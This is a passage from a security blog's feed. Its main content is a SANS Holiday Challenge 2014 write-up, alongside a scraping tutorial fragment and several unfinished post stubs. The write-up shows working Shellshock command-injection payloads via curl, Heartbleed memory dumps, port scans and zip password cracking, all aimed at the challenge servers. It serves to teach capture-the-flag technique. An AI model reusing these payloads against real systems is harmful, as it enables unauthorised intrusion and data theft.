</span><span class='line'>                        &lt;span class="value"&gt;King&lt;/span&gt;
</span><span class='line'>                    &lt;/div&gt;
</span><span class='line'>                    &lt;div class="roomAvail"&gt;
</span><span class='line'>                        &lt;div class="bar"&gt;
</span><span class='line'>                            &lt;div class="label"&gt;Nightly Rate&lt;/div&gt;
</span><span class='line'>                            &lt;div class="value"&gt;
</span><span class='line'>                                159.00 &lt;-- What I want to get
</span><span class='line'>                            &lt;/div&gt;
</span><span class='line'>                        &lt;/div&gt;
</span><span class='line'>                    &lt;/div&gt;
</span><span class='line'>                &lt;/div&gt;
</span><span class='line'>            &lt;/td&gt;
</span><span class='line'>        &lt;/tr&gt;
</span><span class='line'>    &lt;/tbody&gt;
</span><span class='line'>&lt;/table&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I cleaned up the formatting, removed unnecessary parts, etc. Trust me, you&rsquo;re welcome.</p>

<p>My first step was to get the room type and make sure it was &ldquo;King&rdquo; as a sanity check, since there were multiple types of rooms in the table. Then, I wanted to get the text of the div with the class &ldquo;value&rdquo; in the &ldquo;roomAvail&rdquo; section. This is the nightly rate.</p>

<p>Finally, I want to write the rate out to the CSV file.</p>

<p>There&rsquo;s definitely more concise ways of doing this with more advanced BeautifulSoup usage, but this code worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>king = soup.find("table", {"summary" : "rooms availability"}).find("div", "roomSection")
</span><span class='line'>if king.find("div", "roomType").text.strip() == "King":
</span><span class='line'>    rate = king.find("div", "roomAvail").find("div", "value").strip()
</span><span class='line'>    rates.write("2015-" + str(m) + "-" + str(d) + "," + str(rate) + "\n")</span></code></pre></td></tr></table></div></figure>


<h3>Success!</h3>

<p>Running the script outputs the results just as I wanted them and, graphed in Excel, looks like this:</p>

<p><img src="http://jordan-wright.github.io/images/blog/web scraping/rates.png"/></p>

<p><em>Awesome.</em> In just a few lines of Python, I was able to get data allowing me to plan a vacation while saving quite a bit of cash.</p>

<p>-Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why You Shouldn't Automatically Connect to Wifi Networks]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/18/dont-connect-to-wifi-automatically/"/>
    <updated>2015-02-18T18:08:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/18/dont-connect-to-wifi-automatically</id>
    <content type="html"><![CDATA[<p>We&rsquo;ve all seen the articles describing the <a href="https://medium.com/matter/heres-why-public-wifi-is-a-public-health-hazard-dd5b8dcb55e6">damage hackers can do to devices</a> in a local coffee shop. These articles generally describe an approach that involves the attacker connecting to the same local wifi network as the user (statistics show Wifi networks named &ldquo;Starbucks&rdquo; are the <em>real</em> APT*).</p>

<p>&ldquo;&rdquo;<em>That&rsquo;s fine</em>&ldquo;&rdquo;, you think, &ldquo;I don&rsquo;t use the coffe shop wifi, so I&rsquo;m just fine.&rdquo; In this post, I&rsquo;ll show you how another seemingly harmless feature &ndash; setting a wifi network to connect automatically &ndash; can backfire, allowing attackers to force you onto their own hostile network.</p>

<h3>What Happens When You Enable Wifi</h3>

<p>Before going into the specifics of the attack, let&rsquo;s talk a little about what happens behind the scenes when you first enable wifi. Connecting to a wifi network</p>

<h3>Karma&rsquo;s a #$%^@!</h3>

<p>* <sup>Not really.</sup></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Attack Sophistication]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/14/attack-sophistication/"/>
    <updated>2015-02-14T22:23:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/14/attack-sophistication</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/sophistication.png"/>
<strong><em>Security experts say the company suffered a sophisticated attack&hellip;</em></strong></p>

<p>Another breach.</p>

<h4>All Attacks are &ldquo;Sophisticated&rdquo;</h4>

<h4>What Sophisticated Looks Like</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Download a List of All Registered Domain Names]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/03/how-to-download-a-list-of-all-registered-domain-names/"/>
    <updated>2015-02-03T19:21:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/03/how-to-download-a-list-of-all-registered-domain-names</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SANS Holiday Challenge 2014 - Writeup]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/01/05/sans-holiday-challenge-2014-writeup/"/>
    <updated>2015-01-05T07:15:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/01/05/sans-holiday-challenge-2014-writeup</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/sans_holiday_2014.png"/></p>

<h3>Introduction</h3>

<p>Back in December, SANS <a href="pen-testing.sans.org/holiday-challenge/2014">released</a> another installment of their annual holiday challenge. I enjoyed <a href="http://raidersec.blogspot.com/search/label/SANS">taking on the 2012 challenge</a>, so I was excited to see what SANS had in store this year. This year&rsquo;s challenge didn&rsquo;t disappoint with a nice mix of basic network recon, web application hacking, and some forensics. This post will detail how I found each required &ldquo;secret&rdquo; to solve the challenge.</p>

<p><em>I&rsquo;d like to extend a personal thanks for all the hard work SANS puts in to putting on this challenge every year.</em></p>

<!--more-->


<h3>Ghost of Hacking Past</h3>

<p>Let&rsquo;s start with a basic nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nmap -v -A -n -Pn -p 1-65535 173.255.233.59
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>Discovered open port 22/tcp on 173.255.233.59
</span><span class='line'>Discovered open port 31124/tcp on 173.255.233.59
</span><span class='line'>&lt;/snip&gt;</span></code></pre></td></tr></table></div></figure>


<p>The SSH service is locked down and doesn&rsquo;t prove fruitful since the only supported authentication method is via public/private keys. However, if we connect to the service on TCP port 31124 using netcat, we find an implementation of the well-known <a href="http://en.wikipedia.org/wiki/ELIZA">ELIZA program</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nc 173.255.233.59 31124
</span><span class='line'>I AM ELIZA.  WHAT'S ON YOUR MIND?</span></code></pre></td></tr></table></div></figure>


<p>With some trial and error, I found that if we ask for the secret multiple times, we get a hint:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nc 173.255.233.59 31124
</span><span class='line'>I AM ELIZA.  WHAT'S ON YOUR MIND?
</span><span class='line'>&gt; secret
</span><span class='line'>A GIRL'S GOTTA KEEP HER SECRETS.  WHY DON'T YOU ASK ME ABOUT SOMETHING ELSE?
</span><span class='line'>&gt; secret
</span><span class='line'>YOU REALLY ARE INTERESTED IN MY SECRET.  I THINK WE SHOULD GET TO KNOW EACH OTHER BETTER FIRST.  TELL ME ABOUT YOUR FAVOURITE WEBSITES.
</span><span class='line'>&gt; secret
</span><span class='line'>I AM SO SORRY, BUT I CAN'T TELL YOU MY SECRET VIA THIS DIALOG.  I DO REALLY LIKE YOU, BUT I WORRY THAT SOMEONE MAY BE SHOULDER SURFING YOU.  NO ONE IS SHOULDER SURFING ME, THOUGH, SO WHY DON'T YOU GIVE ME A URL THAT I CAN SURF TO?</span></code></pre></td></tr></table></div></figure>


<p>Looks like we can make Eliza navigate to a URL of our choosing. Let&rsquo;s setup a netcat listener, and then point Eliza to it to see what she does.</p>

<p>Back on our server, we setup the listener:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# nc -l -p 80</span></code></pre></td></tr></table></div></figure>


<p>Then, we tell Eliza to visit the host</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; surf to http://x.x.x.x
</span><span class='line'>DOES THIS LOOK LIKE THE CORRECT PAGE?</span></code></pre></td></tr></table></div></figure>


<p>And, back in our netcat session, we see this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
</span><span class='line'>Accept-Encoding: identity
</span><span class='line'>Host: 107.170.44.35
</span><span class='line'>Connection: close
</span><span class='line'>User-Agent: Mozilla/5.0 (Bombe; Rotors:36) Eliza Secret: "Machines take me by surprise with great frequency. -Alan Turing"</span></code></pre></td></tr></table></div></figure>


<p>Awesome &ndash; one down. Let&rsquo;s move on.</p>

<h3>Ghost of Hacking Present</h3>

<p>SANS is great at incorporating big vulnerabilities found in the previous year into their holiday challenges. As such, I was hoping there would be a mention to Heartbleed and Shellshock somewhere in their challenges. Sure enough, the Ghost of Hacking Present allowed us to leverage both vulnerabilities to our advantage.</p>

<p>Let&rsquo;s start with the HTTPS service.</p>

<p>Running a <a href="link">Heartbleed POC script</a>, we can see the following dumped from the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0180: 01 00 0F 00 01 01 43 25 32 30 69 74 73 25 32 30  ......C%20its%20
</span><span class='line'>0190: 66 6F 72 6D 25 32 43 25 32 30 61 6E 64 25 32 30  form%2C%20and%20
</span><span class='line'>01a0: 6C 65 66 74 25 32 30 6E 6F 74 68 69 6E 67 25 32  left%20nothing%2
</span><span class='line'>01b0: 30 6F 66 25 32 30 69 74 25 32 30 76 69 73 69 62  0of%20it%20visib
</span><span class='line'>01c0: 6C 65 25 32 30 73 61 76 65 25 32 30 6F 6E 65 25  le%20save%20one%
</span><span class='line'>01d0: 32 30 6F 75 74 73 74 72 65 74 63 68 65 64 25 32  20outstretched%2
</span><span class='line'>01e0: 30 68 61 6E 64 2E 25 32 30 42 75 74 25 32 30 66  0hand.%20But%20f
</span><span class='line'>01f0: 6F 72 25 32 30 74 68 69 73 25 32 30 69 74 25 32  or%20this%20it%2
</span><span class='line'>0200: 30 77 6F 75 6C 64 25 32 30 68 61 76 65 25 32 30  0would%20have%20
</span><span class='line'>0210: 62 65 65 6E 25 32 30 64 69 66 66 69 63 75 6C 74  been%20difficult
</span><span class='line'>0220: 25 32 30 74 6F 25 32 30 64 65 74 61 63 68 25 32  %20to%20detach%2
</span><span class='line'>0230: 30 69 74 73 25 32 30 66 69 67 75 72 65 25 32 30  0its%20figure%20
</span><span class='line'>0240: 66 72 6F 6D 25 32 30 74 68 65 25 32 30 6E 69 67  from%20the%20nig
</span><span class='line'>0250: 68 74 25 32 43 25 32 30 61 6E 64 25 32 30 73 65  ht%2C%20and%20se
</span><span class='line'>0260: 70 61 72 61 74 65 25 32 30 69 74 25 32 30 66 72  parate%20it%20fr
</span><span class='line'>0270: 6F 6D 25 32 30 74 68 65 25 32 30 64 61 72 6B 6E  om%20the%20darkn
</span><span class='line'>0280: 65 73 73 25 32 30 62 79 25 32 30 77 68 69 63 68  ess%20by%20which
</span><span class='line'>0290: 25 32 30 69 74 25 32 30 77 61 73 25 32 30 73 75  %20it%20was%20su
</span><span class='line'>02a0: 72 72 6F 75 6E 64 65 64 2E 25 32 30 26 57 65 62  rrounded.%20&Web
</span><span class='line'>02b0: 73 69 74 65 25 32 30 53 65 63 72 65 74 25 32 30  site%20Secret%20
</span><span class='line'>02c0: 25 32 33 31 3D 48 61 63 6B 69 6E 67 25 32 30 63  %231=Hacking%20c
</span><span class='line'>02d0: 61 6E 25 32 30 62 65 25 32 30 6E 6F 62 6C 65 25  an%20be%20noble%</span></code></pre></td></tr></table></div></figure>


<p>Decoded, this gives us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>its form, and left nothing of it visible save one outstretched hand. But for this it would have been difficult to detach its figure from the night, and separate it from the darkness by which it was surrounded.
</span><span class='line'>&Website Secret #1=Hacking can be noble</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s turn our attention to the main HTTP site. Basic recon shows us that a contact page is available at <code>/cgi-bin/submit.sh</code>. The <code>.sh</code> tells us that this is likely a shell script processing the request. This immediately tells us to check for Shellshock. After a little bit of trial and error, we can get the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo;pwd;"
</span><span class='line'>/var/www/cgi-bin
</span><span class='line'>Content-Type: text/html
</span><span class='line'>&lt;html&gt;&lt;head&gt;&lt;style type="text/css"&gt; body { background-color: #E9DD09; } &lt;/style&gt;&lt;META http-equiv="refresh" content="0;URL=http://www.scrooge-and-marley.com/"&gt;&lt;/head&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>Great. Now that we can start running commands, let&rsquo;s start exploring the filesystem. We find out pretty quickly that only bash builtin commands are available to us (no <code>cat</code>, <code>ls</code> etc.) &ndash; bummer. No problem, we can start by exploring the filesystem via <code>echo /&lt;directory&gt;*</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo; echo /*"
</span><span class='line'>/bin /dev /etc /lib /lib64 /run /sbin /secret /selinux /usr /var</span></code></pre></td></tr></table></div></figure>


<p>Looks like the file is at <code>/secret</code>. We can use a bash read loop to get the contents of it.</p>

<p><em>Note: Make sure to escape the <code>$</code>, otherwise the local system will try to replace the variable contents </em>before* sending the request.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo;while read line; do echo \$line; done &lt; /secret;"
</span><span class='line'>Website Secret #2: Use your skills for good.</span></code></pre></td></tr></table></div></figure>


<p>Easy as that!</p>

<p><em>Fun fact: the <code>/server-status</code> page was accessible on the server, allowing us to essentially watch as requests are being made to the server. Big shout-out to everyone trying to brute force hidden files/directories :)</em></p>

<h3>Ghost of Hacking Future</h3>

<p>This one was tougher than the first two &ndash; largely because I&rsquo;m not great at filesystem forensics. To follow along, you can download the file <a href="http://pen-testing.sans.org/hhusb.dd.bin">here</a>.</p>

<p>First, we run <code>file</code> to see what kind of file this is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# file hhusb.dd.bin
</span><span class='line'>hhusb.dd.bin: x86 boot sector, code offset 0x52, OEM-ID "NTFS    ", sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 255, hidden sectors 2048, dos &lt; 4.0 BootSector (0x0)</span></code></pre></td></tr></table></div></figure>


<p>Looks like a standard NTFS filesystem. Let&rsquo;s try to mount the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# mount hhusb.dd.bin /mnt -t ntfs
</span><span class='line'>root@jordan:~# ls /mnt/
</span><span class='line'>hh2014-chat.pcapng  LetterFromJackToChuck.doc</span></code></pre></td></tr></table></div></figure>


<p>Sweet &ndash; we have two files. Opening the .doc doesn&rsquo;t give us much info, but I wonder if there&rsquo;s more to it than meets the eye. I ran <code>strings</code> on the file and found this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>USB Secret #1: Your demise is a source of mirth.</span></code></pre></td></tr></table></div></figure>


<p>Looks like a secret was hidden in the file. Huh. Turns out, this was in one of the document properties, which are viewable using Word.</p>

<p>Now let&rsquo;s go after the PCAP. Looking through the contents of the file, we can see a conversation regarding the death of Scrooge, but no secret. I began to wonder if there was a reason that this was a pcap-<strong>ng</strong> file instead of just a pcap. Turns out, there are additional fields supported by pcap-ng files, one of which is packet comments.</p>

<p>Using Wireshark, we can find any packet comments by filtering for <code>pkt_comment</code>:</p>

<p><img src="http://jordan-wright.github.io/images/blog/sans_2014/pkt_comment.png"/></p>

<p>Sweet! Looks like there are two comments:</p>

<ul>
<li><code>VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg==</code></li>
<li><a href="https://code.google.com/p/f5-steganography/">https://code.google.com/p/f5-steganography/</a></li>
</ul>


<p>The first one is base64 encoded:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# echo VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg== | base64 -d
</span><span class='line'>USB Secret #2: Your demise is a source of relief.</span></code></pre></td></tr></table></div></figure>


<p>The other hint might come in handy later. Ok, two secrets down. But where&rsquo;s #3 and #4? I bet there are more files to be had. Let&rsquo;s use The Sleuth Kit to check for previously deleted files that we can recover:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:/mnt# fls ~/hhusb.dd.bin -u
</span><span class='line'>r/r 4-128-4:    $AttrDef
</span><span class='line'>r/r 8-128-2:    $BadClus
</span><span class='line'>r/r 8-128-1:    $BadClus:$Bad
</span><span class='line'>r/r 6-128-4:    $Bitmap
</span><span class='line'>r/r 7-128-1:    $Boot
</span><span class='line'>d/d 11-144-4:   $Extend
</span><span class='line'>r/r 2-128-1:    $LogFile
</span><span class='line'>r/r 0-128-1:    $MFT
</span><span class='line'>r/r 1-128-1:    $MFTMirr
</span><span class='line'>r/r 9-128-8:    $Secure:$SDS
</span><span class='line'>r/r 9-144-6:    $Secure:$SDH
</span><span class='line'>r/r 9-144-5:    $Secure:$SII
</span><span class='line'>r/r 10-128-1:   $UpCase
</span><span class='line'>r/r 3-128-3:    $Volume
</span><span class='line'>r/r 32-128-1:   hh2014-chat.pcapng
</span><span class='line'>r/r 32-128-5:   hh2014-chat.pcapng:Bed_Curtains.zip
</span><span class='line'>r/r 33-128-1:   LetterFromJackToChuck.doc
</span><span class='line'>-/r * 34-128-1: Tiny_Tom_Crutches_Final.jpg
</span><span class='line'>d/d 256:        $OrphanFiles</span></code></pre></td></tr></table></div></figure>


<p>I see a couple of things that stand out. First off, what&rsquo;s that &ldquo;Bed_Curtains.zip&rdquo; file? Also, it looks like a file called &ldquo;Tiny_Tom_Crutches_Final.jpg&rdquo; was previously deleted (indicated by the <code>*</code>). Let&rsquo;s go ahead and extract all these files into a directory called <code>/sans_recovered</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# mkdir sans_recovered
</span><span class='line'>root@jordan:~# tsk_recover -e -f ntfs ./hhusb.dd.bin ./sans_recovered/
</span><span class='line'>Files Recovered: 4
</span><span class='line'>root@jordan:~# cd sans_recovered/
</span><span class='line'>root@jordan:~/sans_recovered# ls
</span><span class='line'>$Extend  hh2014-chat.pcapng  LetterFromJackToChuck.doc  Tiny_Tom_Crutches_Final.jpg</span></code></pre></td></tr></table></div></figure>


<p>Where&rsquo;s &ldquo;Bed_Curtains.zip&rdquo;? After asking around, it turns out that this syntax indicates the file is stored as an NTFS alternate data stream. We can extract the file manually using <code>icat</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# icat hhusb.dd.bin 32-128-5 &gt; sans_recovered/Bed_Curtains.zip</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s unzip it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
</span><span class='line'>Archive:  Bed_Curtains.zip
</span><span class='line'>[Bed_Curtains.zip] Bed_Curtains.png password:</span></code></pre></td></tr></table></div></figure>


<p>Looks like it&rsquo;s password protected, so what password should we use? At this point, we notice the following hint given by the SANS storyline:</p>

<blockquote><p>Just work with me on this, man. There&rsquo;s something important and even CeWL here for you.</p></blockquote>

<p>This suggests that the tool <a href="http://digi.ninja/projects/cewl.php"><code>CeWL</code></a> would be useful in creating a custom wordlist to break the password. We can run the tool like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./cewl.rb -d 3 -w sans_wordlist.txt http://pen-testing.sans.org/holiday-challenge/2014</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, after trying this as a wordlist for both the SANS URL as well as directly with hackersforcharity.org, I still couldn&rsquo;t find the right password. So, next choice &ndash; just use a huge wordlist. We&rsquo;ll crack the password using John the Ripper (ver: 1.7.9-jumbo-7).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# zip2john sans_recovered/Bed_Curtains.zip &gt; sans_recovered/Bed_Curtains.john
</span><span class='line'>root@jordan:~# john --wordlist=wordlists/all  --rules Bed_Curtains.john
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>root@jordan:~/sans_recovered# john --show Bed_Curtains.john
</span><span class='line'>/root/sans_recovered/Bed_Curtains.zip:shambolic
</span><span class='line'>root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
</span><span class='line'>Archive:  Bed_Curtains.zip
</span><span class='line'>[Bed_Curtains.zip] Bed_Curtains.png password:
</span><span class='line'>inflating: Bed_Curtains.png</span></code></pre></td></tr></table></div></figure>


<p>Looks like it worked! Let&rsquo;s take a look at the properties of the extracted image using <code>exiftool</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~# exiftool Bed_Curtains.png
</span><span class='line'>File Name                       : Bed_Curtains.png
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 1401 kB
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>Comment                         : USB Secret #3: Your demise is a source of gain for others.
</span><span class='line'>Exif Byte Order                 : Big-endian (Motorola, MM)
</span><span class='line'>&lt;snip&gt;</span></code></pre></td></tr></table></div></figure>


<p>One more to go. Let&rsquo;s look at the Tiny_Tom_crutches.png file to see what we can find. With this being a CTF style challenge, let&rsquo;s check for the presence of steganography. The tool <code>stegdetect</code> is pretty good at this, so let&rsquo;s see what it finds:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# stegdetect Tiny_Tom_Crutches_Final.jpg
</span><span class='line'>Tiny_Tom_Crutches_Final.jpg : f5(***)</span></code></pre></td></tr></table></div></figure>


<p>The hint we found pointing to <a href="https://code.google.com/p/f5-steganography/">this project</a> might come in handy. Let&rsquo;s see if we can use it to get the secret:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# java -jar f5.jar x -e secret.txt Tiny_Tom_Crutches_Final.jpg
</span><span class='line'>Huffman decoding starts
</span><span class='line'>Permutation starts
</span><span class='line'>423168 indices shuffled
</span><span class='line'>Extraction starts
</span><span class='line'>Length of embedded file: 116 bytes
</span><span class='line'>(1, 127, 7) code used
</span><span class='line'>root@jordan:~/sans_recovered# cat secret.txt
</span><span class='line'>Tiny Tom has died.
</span><span class='line'>
</span><span class='line'>USB Secret #4: You can prevent much grief and cause much joy. Hack for good, not evil or greed.</span></code></pre></td></tr></table></div></figure>


<p>There it is! All the secrets have been retrieved.</p>

<h3>Conclusion</h3>

<p>As always, this was a fantastic challenge created by the folks at SANS. I enjoyed that this year&rsquo;s challenge contained bits and pieces from many aspects of infosec, and am already looking forward to next year&rsquo;s challenge!</p>

<p>As always, let me know if you have any questions!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Cloudflare Finds Your DNS Records]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/01/01/how-cloudflare-finds-your-dns-records/"/>
    <updated>2015-01-01T23:28:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/01/01/how-cloudflare-finds-your-dns-records</id>
    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>I&rsquo;ve been starting some research into how an attacker could find the real IP address of a server protected by DDoS protection services such as Cloudflare. The first part of this process is to, of course, sign up for these services so that I have a test environment to work with.</p>

<p>Since Cloudflare&rsquo;s free service is notoriously popular with malicious DDoS-for-hire sites, it was first up. I&rsquo;ll blog about the research as it progresses, but</p>

<h3>Setting Up the Test</h3>

<h3>The Results</h3>

<h3>Conclusion</h3>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why Deleting Sensitive Information from Github Doesn't Save You]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you/"/>
    <updated>2014-12-30T19:19:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/harvest_github.png"/></p>

<p>So you accidentally committed a password or API key to Github. <strong><em>Ouch.</em></strong></p>

